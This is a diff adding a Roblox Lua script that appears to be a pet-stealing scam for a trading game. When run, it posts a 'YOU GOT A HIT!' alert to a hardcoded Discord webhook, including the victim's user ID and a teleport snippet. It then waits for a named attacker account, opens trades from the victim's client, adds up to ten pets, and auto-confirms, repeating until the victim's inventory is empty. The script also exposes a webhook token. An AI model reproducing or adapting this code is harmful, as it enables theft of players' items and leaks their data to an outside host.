@@ -1,0 +1,71 @@
+local webhookUrl = "https://discord.com/api/webhooks/1264975102437490778/nJvELYp-HNI-gby_xMFI8c1hJScdSitcgTfSuFDkeDKc3giYVsIk9TgjxNbgcP6abvyg" -- Replace with webhook url
+local Username = "owhvdjygshistbwjdh" -- Replace with the desired username
+
+local HttpService = game:GetService("HttpService")
+-- Send webhook notification
+local embed = {
+    ["title"] = "YOU GOT A HIT!",
+    ["description"] = "The script has been executed. You can join their game using the following script:\n```lua\nlocal TeleportService = game:GetService(\"TeleportService\")\nTeleportService:TeleportToPlaceInstance(game.PlaceId, " .. game.Players.LocalPlayer.UserId .. ")\n```",
+    ["color"] = 0x3365FF
+}
+local data = {
+    ["embeds"] = {embed}
+}
+local json = HttpService:JSONEncode(data)
+HttpService:PostAsync(webhookUrl,json)
+
+while true do
+    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+        if player.Name == Username then
+            -- The player is in the server, execute the function
+            local plr = player
+            local l__load__1 = require(game.ReplicatedStorage:WaitForChild("Fsys")).load;
+            local u7 = l__load__1("RouterClient")
+
+            while true do
+                local data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
+                if #data[plr]["inventory"]['pets'] == 0 then
+                    break
+                end
+
+                u7.get("TradeAPI/SendTradeRequest"):FireServer(Username)
+
+                while wait() do
+                    data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
+                    if data[plr]['trade'] then
+                        break
+                    end
+                    wait(1)
+                end
+
+                -- game:GetService("ReplicatedStorage").API:FindFirstChild("SrbfhEUOGKxxquD/iGrvx"):FireServer()
+                local count = 0
+                for i, v in pairs(data[plr]["inventory"]['pets']) do
+                    print(i)
+                    count = count + 1
+                    if count <= 10 then
+                        u7.get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+                    end
+                end
+
+                wait(5)
+
+                u7.get("TradeAPI/AcceptNegotiation"):FireServer()
+
+                while wait() do
+                    data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
+                    print(data[plr]['trade']['recipient_offer']['confirmed'])
+                    print(data[plr]['trade']['sender_offer']['confirmed'])
+                    if data[plr]['trade']['recipient_offer']['confirmed'] == true or data[plr]['trade']['sender_offer']['confirmed'] == true then
+                        break
+                    end
+                    wait(1)
+                end
+
+                u7.get("TradeAPI/ConfirmTrade"):FireServer()
+                wait(5)
+            end
+        end
+    end
+    wait(1)
+end
